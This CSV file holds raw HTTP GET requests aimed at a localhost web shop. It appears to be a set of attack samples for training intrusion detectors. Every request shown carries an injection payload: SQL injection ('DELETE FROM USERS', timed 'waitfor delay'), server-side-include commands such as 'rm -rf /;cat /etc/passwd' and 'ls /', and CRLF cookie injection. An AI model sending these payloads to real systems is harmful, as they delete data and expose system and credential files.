id,text
17234,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
2938,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
17336,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27+DELETE+FROM+USERS&precio=5521&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
9344,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
7355,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
6981,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
15807,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
15372,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
15512,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
9688,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27+DELETE+FROM+USERS HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
6803,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=3858&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
6780,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=9468&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
1162,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
22764,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6525&B1=Pasar+por+caja%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
17601,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
14766,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
12659,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
8175,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&precio=3845&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
23446,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
21762,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
24150,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
10866,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=622&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
3527,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3212%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
15584,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6987%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
13865,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27+DELETE+FROM+USERS&precio=4981&B1=Confirmar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
24314,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9611&B1=Confirmar%27+DELETE+FROM+USERS HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
11324,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
17841,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5698&B1=Pasar+por+caja%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
20695,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8792&B1=Pasar+por+cajaany%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
13339,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
6770,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
17158,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
23503,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8409&B1=Pasar+por+cajaany%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
10995,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
20954,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
10718,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
13820,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
4180,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
3053,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
18706,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
23666,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
5181,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
19292,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
17932,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
22243,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
22533,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
